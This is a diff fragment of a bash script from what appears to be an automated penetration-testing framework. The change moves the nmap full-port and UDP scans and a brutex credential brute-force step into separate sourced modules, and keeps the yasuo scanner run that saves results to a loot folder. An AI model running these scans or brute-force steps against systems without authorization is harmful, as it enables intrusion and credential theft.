+    /bin/yasuo -r $TARGET -b all | tee $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
+    tee $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/yasuo-$TARGET.raw > $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
+  else
+    cd $PLUGINS_DIR/yasuo
+    ruby yasuo.rb -r $TARGET -b all | tee $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/yasuo-$TARGET.raw > $LOOT_DIR/output/yasuo-$TARGET.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/yasuo-$TARGET.raw 2> /dev/null
+  fi
 fi
 
-cd $SNIPER_DIR
-
-if [ "$FULLNMAPSCAN" = "0" ]; then
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED SKIPPING FULL NMAP PORT SCAN $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-else
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING FULL PORT SCAN $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -Pn -A -v -T4 -p$DEFAULT_TCP_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
-  xsltproc $INSTALL_DIR/bin/nmap-bootstrap.xsl $LOOT_DIR/nmap/nmap-$TARGET.xml -o $LOOT_DIR/nmap/nmapreport-$TARGET.html 2> /dev/null
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED PERFORMING UDP PORT SCAN $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -Pn -sU -A -T4 -v -p$DEFAULT_UDP_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET-udp.xml
-fi
-
-if [ "$AUTOBRUTE" = "0" ]; then
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED SKIPPING BRUTE FORCE $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-else
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING BRUTE FORCE $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  brutex $TARGET | tee $LOOT_DIR/credentials/brutex-$TARGET 2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/credentials/brutex-$TARGET > $LOOT_DIR/credentials/brutex-$TARGET.txt 2> /dev/null
-  rm -f $LOOT_DIR/credentials/brutex-$TARGET
-  cd $INSTALL_DIR
-  rm -f hydra.restore
-  rm -f scan.log
-  echo ""
-fi
+cd $INSTALL_DIR
+source modes/fullportscan.sh
+source modes/bruteforce.sh
 
 rm -f $LOOT_DIR/.fuse_* 2> /dev/null
+sort -u $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null > $LOOT_DIR/ips/ips-all-sorted.txt 2> /dev/null
 
 echo -e "${OKGREEN}====================================================================================${RESET}"
 echo -e "$OKRED SCAN COMPLETE! $RESET"
 echo -e "${OKGREEN}====================================================================================${RESET}"
-
+echo "$TARGET" >> $LOOT_DIR/scans/updated.txt
 if [ "$LOOT" = "1" ] && [ -z "$NOLOOT" ]; then
   loot
 fi
